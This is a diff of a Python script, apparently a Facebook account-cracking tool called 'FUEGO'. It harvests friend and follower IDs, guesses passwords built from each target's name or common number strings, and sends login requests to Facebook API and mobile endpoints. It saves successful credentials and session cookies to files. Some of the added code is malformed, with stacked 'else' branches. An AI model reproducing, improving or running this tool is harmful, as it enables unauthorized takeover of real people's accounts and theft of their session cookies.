@@ -57,12 +57,6 @@ header={'x-fb-connection-bandwidth': repr(bd),'x-fb-sim-hni': repr(sim),'x-fb-ne
 reload(sys)
 
 sys.setdefaultencoding("utf-8")
-c = ""
-
-c2 = ""
-
-c3 = ""
-
 
 import os
 try:
@@ -139,39 +133,11 @@ def login():
 		requests.get("https://mbasic.facebook.com")
 	except requests.exceptions.ConnectionError:
 		exit("Internet Connection Error")
-	
-gg
-Username = "FUEGO"
-Password = "LEGEND404"
-
-loop = 'true'
-while (loop == 'true'):
-    username = raw_input("\033[1;97m[\033[1;91m+\033[1;97m] \033[1;91m \x1b[1;92mEnter Tool Username \x1b[1;91m: \x1b[1;97m")
-    if (username == Username):
-    	password = raw_input("\033[1;97m[\033[1;91m+\033[1;97m] \033[1;91m \x1b[1;93mEnter Tool Password \x1b[1;91m: \x1b[1;97m")
-        if (password == Password):
-            print "Successfully Logged  In as " + username #Dev:FUEGO
-	    time.sleep(2)
-            loop = 'false'
-        else:
-            print "\033[1;97mIncorrect Password"
-            os.system('xdg-open https://www.facebook.com/100008297554931')
-    else:
-        print "\033[1;97mIncorrect Username"
-        os.system('xdg-open https://www.facebook.com/100008297554931')
-idh = []
-
-def main():
-
-    os.system("clear")
-print(" ")
-try :
+	try:
 		token = open("login.txt", "r")
 		menu()
-except KeyError:
+	except KeyError:
 		print("\033[1;33mIF you dont have Token Go And Download !Get token app! ")
-		print(" ")
-		print(" ")
 		token = raw_input("\033[1;31m[1] L O G I N - W I T H - T O K E N \033[1;33m : ")
 		if token == "":
 			print("Wrong Input")
@@ -277,47 +243,20 @@ def menu():
 	elif Bilal == "5" or Bilal == "05":
 		setting_ua()
 	elif Bilal == "6" or Bilal == "06":
-			ask = raw_input("\033[1;97mYou are requesting for a \033[1;97m[\033[1;91mpremium\033[1;97m] \033[1;91my\033[1;97m/\033[1;91mn \033[1;97m :
-				if ask == "y"
-				os.system('xdg-open https://www.facebook.com/100008297554931')
-				if ask == "n" 
-				menu()
+			setting_ua()
 	elif Bilal == "7" or Bilal == "07":
-			ask = raw_input("\033[1;97mYou are requesting for a \033[1;97m[\033[1;91mpremium\033[1;97m] \033[1;91my\033[1;97m/\033[1;91mn \033[1;97m :
-				if ask == "y"
-				os.system('xdg-open https://www.facebook.com/100008297554931')
-				if ask == "n" 
-				menu()
+			setting_ua()
 	elif Bilal == "8" or Bilal == "08":
-			ask = raw_input("\033[1;97mYou are requesting for a \033[1;97m[\033[1;91mpremium\033[1;97m] \033[1;91my\033[1;97m/\033[1;91mn \033[1;97m :
-				if ask == "y"
-				os.system('xdg-open https://www.facebook.com/100008297554931')
-				if ask == "n" 
-				menu()
+			setting_ua()
+		
         elif Bilal == "9" or Bilal == "09":
-			ask = raw_input("\033[1;97mYou are requesting for a \033[1;97m[\033[1;91mpremium\033[1;97m] \033[1;91my\033[1;97m/\033[1;91mn \033[1;97m :
-				if ask == "y"
-				os.system('xdg-open https://www.facebook.com/100008297554931')
-				if ask == "n" 
-				menu()
+			setting_ua()
 	elif Bilal == "10" or Bilal == "10":
-			ask = raw_input("\033[1;97mYou are requesting for a \033[1;97m[\033[1;91mpremium\033[1;97m] \033[1;91my\033[1;97m/\033[1;91mn \033[1;97m :
-				if ask == "y"
-				os.system('xdg-open https://www.facebook.com/100008297554931')
-				if ask == "n" 
-				menu()
+			setting_ua()
 	elif Bilal == "11" or Bilal == "11":
-			ask = raw_input("\033[1;97mYou are requesting for a \033[1;97m[\033[1;91mpremium\033[1;97m] \033[1;91my\033[1;97m/\033[1;91mn \033[1;97m :
-				if ask == "y"
-				os.system('xdg-open https://www.facebook.com/100008297554931')
-				if ask == "n" 
-				menu()
+			setting_ua()
 	elif Bilal == "12" or Bilal == "12":
-			ask = raw_input("\033[1;97mYou are requesting for a \033[1;97m[\033[1;91mpremium\033[1;97m] \033[1;91my\033[1;97m/\033[1;91mn \033[1;97m :
-				if ask == "y"
-				os.system('xdg-open https://www.facebook.com/100008297554931')
-				if ask == "n" 
-				menu()
+			setting_ua()
 	elif Bilal == "0" or Bilal == "00":
 		os.system("rm -f login.txt")
 		exit("\n\033[1;37m[\033[1;32m!\033[1;37m] Token removed")
@@ -337,7 +276,7 @@ def publik():
 			nama = i["name"].rsplit(" ")[0]
 			id.append(uid+"<=>"+nama)
 	except KeyError:
-		exit("\n\033[1;37m[\033[1;32m+\033[1;37m] account friend list is not public")
+		exit("\n\033[1;37m[\033[1;32m+\033[1;37m] Account Friend List is Not Public")
 	print("\033[1;31m[\033[1;31m+\033[1;31m] Total id  : \033[1;31m%s\033[1;31m"%(len(id))) 
 
 def follower():
@@ -440,9 +379,13 @@ def bapi(user):
 	elif len(name)<=2:
 		pwx = [ name, name+"1", name+"12", name+"123", name+"1234", name+"12345" ]
 	elif len(name)<=3:
-		pwx = [ name, name+"1", name+"12", name+"123", name+"1234", name+"12345" ]
+		pwx = [ name, name+"2004", name+"2003", name+"2001", name+"2002", name+"2000" ]
 	else:
-		pwx = [ name, name+"1", name+"12", name+"123", name+"1234", name+"12345" ]
+		pwx = [ 668844, name+"111", name+"222", name+"333", name+"444", name+"555" ]
+	else : 
+		pwx = [ 112233, 123456, 102030, 223344, 445566, 556677, 778899, 468903, 780325 ]
+	else :
+		pwx = [ 786786, 000786, 000123, 000456, 000789 , 000678, 457625, 67893, 998833 ]
 	try:
 		for pw in pwx:
 			pw = pw.lower()
@@ -450,13 +393,13 @@ def bapi(user):
 			headers_ = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), "x-fb-sim-hni": str(random.randint(20000, 40000)), "x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA", "user-agent": ua, "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
 			send = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers_)
 			if "session_key" in send.text and "EAAA" in send.text:
-				print("\r\033[1;97m[FUEGO-OK] %s|%s|%s\033[1;92m"%(uid, pw, send.json()[""]))
+				print("\r\033[1;92m[FUEGO-OK] %s|%s|%s"%(uid, pw, send.json()[""]))
 				ok.append("%s|%s"%(uid, pw))
 				open("OK/%s.txt"%(tBilall),"a").write(" + %s|%s\n"%(uid, pw))
 				break
 				continue
 			elif "www.facebook.com" in send.json()["error_msg"]:
-				print("\r\033[1;97m[FUEGO-CP] %s|%s\033[1;92m        "%(uid, pw))
+				print("\r\033[1;93m[FUEGO-CP] %s|%s "%(uid, pw))
 				cp.append("%s|%s"%(uid, pw))
 				open("CP/%s.txt"%(tBilall),"a").write(" + %s|%s\n"%(uid, pw))
 				break
@@ -554,13 +497,13 @@ def mobile(user):
 			gaaa = ses.post("https://touch.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Ftouch.facebook.com%2F&lwv=100&refid=8",data=kwargs)
 			if "c_user" in ses.cookies.get_dict().keys():
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-				print("\r\033[0;92m[FUEGO-OK] %s|%s|%s\033[0;97m"%(uid, pw, kuki))
+				print("\r\033[0;92m[FUEGO-OK] %s|%s|%s"%(uid, pw, kuki))
 				ok.append("%s|%s"%(uid, pw))
 				open("OK/%s.txt"%(tBilall),"a").write(" + %s|%s\n"%(uid, pw))
 				break
 				continue
 			elif "checkpoint" in ses.cookies.get_dict().keys():
-				print("\r\033[0;97m[FUEGO-CP] %s|%s\033[0;97m        "%(uid, pw))
+				print("\r\033[0;93m[FUEGO-CP] %s|%s"%(uid, pw))
 				cp.append("%s|%s"%(uid, pw))
 				open("CP/%s.txt"%(tBilall),"a").write(" + %s|%s\n"%(uid, pw))
 				break
@@ -576,16 +519,16 @@ def manual():
 	except IOError:
 		ua = ("Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]")
 	global loop, token
-	print("\n[+] Type , For 2nd Password For Example : 112233,334455,445566,223344 etc")
+	print("\n[+] Enter passwords of your own : ")
 	asu = raw_input("[+] Enter Passwords : ").split(",")
 	if len(asu) =="":
 		exit("[+] Wrong Input")
-	print("[+] Enter 2-4 Passwords For Fast Cracking Speed\n")
+	print("[+] Enter 2-4 Passwords for fast cracking speed\n")
 
 	def main(user):
 		global loop, token
 		sys.stdout.write(
-			"\r\033[0;92m[\033[1;92mCracking\033[1;92m]\033[1;92m %s/%s -> OK:-%s - CP:-%s "%(loop, len(id), len(ok), len(cp))
+			"\r\033[0;92m[\033[1;92mcracking\033[1;92m]\033[1;92m %s/%s -> OK:-%s - CP:-%s "%(loop, len(id), len(ok), len(cp))
 		); sys.stdout.flush()
 		uid, name = user.split("<=>")
 		try:
@@ -606,13 +549,13 @@ def manual():
 				gaaa = ses.post("https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Fmbasic.facebook.com%2F&lwv=100&refid=8",data=kwargs)
 				if "c_user" in ses.cookies.get_dict().keys():
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-					print("\r\033[1;97m[FUEGO-OK] %s|%s|%s\033[1;97m"%(uid, pw, kuki))
+					print("\r\033[1;92m[FUEGO-OK] %s|%s|%s"%(uid, pw, kuki))
 					ok.append("%s|%s"%(uid, pw))
 					open("OK/%s.txt"%(tBilall),"a").write(" + %s|%s\n"%(uid, pw))
 					break
 					continue
 				elif "checkpoint" in ses.cookies.get_dict().keys():
-					print("\r\033[1;97m[FUEGO-CP] %s|%s\033[1;97m        "%(uid, pw))
+					print("\r\033[1;93m[FUEGO-CP] %s|%s"%(uid, pw))
 					cp.append("%s|%s"%(uid, pw))
 					open("CP/%s.txt"%(tBilall),"a").write(" + %s|%s\n"%(uid, pw))
 					break
@@ -632,12 +575,12 @@ def setting_ua():
 	if ua =="":
 		menu()
 	elif ua == "1":
-		c_ua = raw_input(" [+] Enter User-Agent : ")
-		c_ua = raw_input(" [+] IPHONE  : ")
-		c_ua = raw_input(" [+] SAMSUNG : ")
-		c_ua = raw_input(" [+] XIAOMI: ")
-		c_ua = raw_input(" [+] NOKIA : ")
-		c_ua = raw_input(" [+] LINUX: ")
+		print("\033[1;93m [+] IPHONE  ")
+		print(" [+] SAMSUNG  ")
+		print(" [+] XIAOMI ")
+		print(" [+] NOKIA  ")
+		print(" [+] LINUX ")
+		c_ua = raw_input("\033[1;97m [+] Enter User-Agent : ")
 		open(".ua", "w").write(c_ua)
 		time.sleep(1)
 		raw_input("\n [!] Press 'Enter' to save User-Agent")
